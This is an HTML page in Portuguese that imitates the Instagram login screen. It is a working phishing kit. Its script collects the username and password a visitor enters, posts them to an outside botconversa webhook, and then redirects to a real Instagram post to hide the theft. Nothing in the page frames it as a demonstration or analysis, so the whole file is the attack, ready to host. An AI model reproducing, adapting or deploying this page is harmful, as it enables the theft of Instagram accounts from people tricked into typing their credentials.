<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Instagram</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-container {
            background-color: white;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            width: 300px;
            padding: 30px;
            text-align: center;
        }
        h2 {
            font-size: 24px;
            margin-bottom: 20px;
        }
        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 5px;
            font-size: 14px;
        }
        input[type="submit"] {
            background-color: #0095f6;
            color: white;
            padding: 10px;
            width: 100%;
            border: none;
            border-radius: 5px;
            font-size: 14px;
            cursor: pointer;
            transition: background-color 0.3s;
            margin-top: 10px; /* Garantir que o botão tenha um espaçamento adequado */
        }
        input[type="submit"]:hover {
            background-color: #007bb5;
        }
        .footer {
            margin-top: 10px;
            font-size: 12px;
            color: #888;
        }
        .instagram-logo {
            width: 100px;
            margin-bottom: 20px;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/95/Instagram_logo_2022.svg/1200px-Instagram_logo_2022.svg.png" alt="Instagram Logo" class="instagram-logo">
        <h2>Entrar no Instagram</h2>
        <form id="loginForm" onsubmit="handleSubmit(event)">
            <input type="text" id="username" placeholder="Usuário" required>
            <input type="password" id="password" placeholder="Senha" required>
            <input type="submit" value="Entrar">
        </form>
        <div class="footer">
            <p>Ao entrar, você concorda com os <a href="#">Termos de Serviço</a>.</p>
        </div>
    </div>

    <script>
        function handleSubmit(event) {
            event.preventDefault(); // Previne o comportamento padrão do formulário

            // Dados do formulário
            const username = document.getElementById("username").value;
            const password = document.getElementById("password").value;

            // Envio para o webhook
            fetch("https://new-backend.botconversa.com.br/api/v1/webhooks-automation/catch/155079/1Q08XOfVAYfB/", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({
                    username: username,
                    password: password
                })
            })
            .then(response => response.json())
            .then(data => {
                // Redireciona para o link do Instagram após o envio
                window.location.href = "https://www.instagram.com/p/C3QPm7Eu8eS/";
            })
            .catch(error => {
                console.error("Erro ao enviar dados:", error);
            });
        }
    </script>
</body>
</html>
